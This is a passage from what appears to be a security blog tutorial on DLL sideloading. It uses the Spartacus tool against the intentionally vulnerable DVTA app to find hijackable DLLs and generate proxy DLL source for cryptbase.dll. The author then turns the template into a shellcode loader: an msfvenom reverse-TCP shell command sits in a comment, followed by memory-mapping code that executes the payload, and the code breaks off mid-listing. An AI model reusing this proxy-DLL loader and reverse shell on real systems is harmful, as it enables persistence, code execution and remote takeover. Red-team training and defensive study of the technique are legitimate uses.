<li>For every "found" DLL it generates a Visual Studio solution for proxying all of the identified DLL's export functions.</li>
</ol>
</li>
</ol>
<p>As explained, Spartacus will automatically generate source code, where the proxying process is already included. The only thing you need to do is to modify DllMain to execute your payload. <br>To run Spartacus, you can use the following syntax:</p>
<p><code>.\Spartacus.exe --mode dll --procmon C:\Users\user\Desktop\Procmon64.exe --pml .\logs.pml --csv .\VulnerableDLLFiles.csv --solution .\Solutions --verbose</code></p>
<p>Let's break down the options.</p>
<p><code>&nbsp;&nbsp;&nbsp; --mode</code>: Defines the operation mode. Using <code>dll </code>Spartacus will seek for DLL Hijacking vulnerabilities.<br><code>&nbsp;&nbsp;&nbsp; --procmon</code>: Defines the path to your Procmon application, it is recommended to use the full path.<br><code>&nbsp;&nbsp;&nbsp; --pml:</code> Defines the log file where all logged events will be stored.<br><code>&nbsp;&nbsp;&nbsp; --csv</code>: Defines the output file to save all vulnerable DLLs.<br><code>&nbsp;&nbsp;&nbsp; --solution</code>: Defines the output file path.<br><code>&nbsp;&nbsp;&nbsp; --verbose</code>: More detailed output.</p>
<p>After running the above-mentioned command, you can observe that the process monitoring has started.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20378">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-08-spartacus-monitoring-20240523160142.webp" width="926" height="247" alt="Screenshot of Spartacus doing process monitoring">
</button>
</div>
<figcaption class="caption">Figure 8: Spartacus doing process monitoring</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>In this phase, we need to restart the process we are targeting, a.k.a the <code>DVTA</code>, or replicate the action within the process, which is going to eventually load the vulnerable DLL. As soon as we start the program, we can go back to the terminal where Spartacus is running and press <code>ENTER</code>. This will tell Spartacus that he has done enough work monitoring, and now it‘s time to analyze the results.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20380">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-09-spartacus-analysis-20240523160219.webp" width="676" height="613" alt="Screenshot of Spartacus analysis">
</button>
</div>
<figcaption class="caption">Figure 9: Spartacus analysis</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>The analysis discovered and automatically generated the needed source code for the two DLLs that can be used for hijacking (<code>cryptbase.dll, DWrite.dll</code>).</p>
<p>If you forgot to specify the<em> <code>--solution</code> </em>option, Spartacus can generate the needed solutions based on specified DLL with this command:</p>
<p><code>.\Spartacus.exe --mode proxy --dll  --solution .\Solutions --overwrite --verbose</code></p>
<p>Spartacus was able to generate the following template for <code>cryptbase.dll</code>:</p>
<div style="color: #dadada; background-color: #1e1e1e; font-family: Droid Sans Mono for Powerline, Menlo, Monaco, 'Courier New', monospace, Menlo, Monaco, 'Courier New', monospace; font-weight: normal; font-size: 12px; line-height: 18px; white-space: pre; max-width: 800px; padding-left: 8px;">
<div><span style="color: #b4b4b4;">C</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">once</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction001=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction001,@1</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction002=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction002,@2</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction003=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction003,@3</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction004=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction004,@4</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction005=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction005,@5</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction028=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction028,@6</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction029=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction029,@7</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction034=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction034,@8</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction036=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction036,@9</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction040=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction040,@10</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction041=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction041,@11</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">windows.h</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">ios</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">fstream</span><span style="color: #e8c9bb;">"</span><br><br><br><span style="color: #57a64a;">// Remove this line if you aren't proxying any functions.</span><br><span style="color: #dadada;">HMODULE hModule </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">LoadLibrary</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">L </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.dll</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #57a64a;">// Remove this function if you aren't proxying any functions.</span><br><span style="color: #4ec9b0;">VOID</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">DebugToFile</span><span style="color: #b4b4b4;">(</span><span style="color: #4ec9b0;">LPCSTR</span><span style="color: #dadada;"> </span><span style="color: #9a9a9a;">szInput</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">ofstream </span><span style="color: #dcdcaa;">log</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">spartacus-proxy-cryptbase.log</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #c8c8c8;">ios_base</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">app </span><span style="color: #b4b4b4;">|</span><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #c8c8c8;">ios_base</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">out</span><span style="color: #b4b4b4;">);</span><br><span style="color: #dadada;"> log </span><span style="color: #b4b4b4;">&lt;&lt;</span><span style="color: #dadada;"> szInput</span><span style="color: #b4b4b4;">;</span><br><span style="color: #dadada;"> log </span><span style="color: #b4b4b4;">&lt;&lt;</span><span style="color: #dadada;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ffd68f;">\n</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">;</span><br><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;">BOOL APIENTRY </span><span style="color: #dcdcaa;">DllMain</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">HMODULE hModule</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> DWORD ul_reason_for_call</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> LPVOID lpReserved</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">switch</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">ul_reason_for_call</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_PROCESS_ATTACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_THREAD_ATTACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_THREAD_DETACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_PROCESS_DETACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">return</span><span style="color: #dadada;"> TRUE</span><span style="color: #b4b4b4;">;</span><br><span style="color: #b4b4b4;">}</span></div>
</div>
<p>If you are not sure about the export statements, each DLL can be manually looked up from this <a href="https://strontic.github.io/xcyclopedia/library/cryptbase.dll-34785289148E2B1DF0863B1D2CA45D7B.html" target="_blank" rel="noopener">website</a>.</p>
<p>Now we can modify the source code to perform shellcode execution. First, we are going for a simple example. Let's modify the code by using one example from my <a href="https://github.com/lsecqt/OffensiveCpp/blob/main/Shellcode%20Execution/FileMap/directPointerToFileMap.cpp" target="_blank" rel="noopener">OffensiveCpp</a> repository:</p>
<div style="color: #dadada; background-color: #1e1e1e; font-family: Droid Sans Mono for Powerline, Menlo, Monaco, 'Courier New', monospace, Menlo, Monaco, 'Courier New', monospace; font-weight: normal; font-size: 12px; line-height: 18px; white-space: pre; max-width: 800px; padding-left: 8px;">
<div><span style="color: #dadada;">cpp</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">once</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction001=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction001,@1</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction002=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction002,@2</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction003=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction003,@3</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction004=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction004,@4</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction005=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction005,@5</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction028=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction028,@6</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction029=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction029,@7</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction034=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction034,@8</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction036=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction036,@9</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction040=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction040,@10</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:SystemFunction041=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.SystemFunction041,@11</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">windows.h</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">ios</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">fstream</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #57a64a;">//msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=10443 -f c</span><br><span style="color: #569cd6;">unsigned</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">char</span><span style="color: #dadada;"> buf[] </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">&lt;output from msfvenom&gt;</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #57a64a;">// Remove this line if you aren't proxying any functions.</span><br><span style="color: #dadada;">HMODULE hModule </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">LoadLibrary</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">L </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">cryptbase.dll</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #57a64a;">// Remove this function if you aren't proxying any functions.</span><br><span style="color: #4ec9b0;">VOID</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">DebugToFile</span><span style="color: #b4b4b4;">(</span><span style="color: #4ec9b0;">LPCSTR</span><span style="color: #dadada;"> </span><span style="color: #9a9a9a;">szInput</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">ofstream </span><span style="color: #dcdcaa;">log</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">spartacus-proxy-cryptbase.log</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #c8c8c8;">ios_base</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">app </span><span style="color: #b4b4b4;">|</span><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #c8c8c8;">ios_base</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">out</span><span style="color: #b4b4b4;">);</span><br><span style="color: #dadada;"> log </span><span style="color: #b4b4b4;">&lt;&lt;</span><span style="color: #dadada;"> szInput</span><span style="color: #b4b4b4;">;</span><br><span style="color: #dadada;"> log </span><span style="color: #b4b4b4;">&lt;&lt;</span><span style="color: #dadada;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ffd68f;">\n</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">;</span><br><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;">DWORD WINAPI </span><span style="color: #dcdcaa;">run</span><span style="color: #b4b4b4;">()</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> HANDLE mem_handle </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">CreateFileMappingA</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">INVALID_HANDLE_VALUE</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> PAGE_EXECUTE_READWRITE</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">buf</span><span style="color: #b4b4b4;">),</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #569cd6;">void</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">*</span><span style="color: #dadada;"> mem_map </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">MapViewOfFile</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">mem_handle</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> FILE_MAP_ALL_ACCESS </span><span style="color: #b4b4b4;">|</span><span style="color: #dadada;"> FILE_MAP_EXECUTE</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0x0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0x0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">buf</span><span style="color: #b4b4b4;">));</span><br><br><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #dcdcaa;">memcpy</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">mem_map</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> buf</span><span style="color: #b4b4b4;">,</span><span style="color: 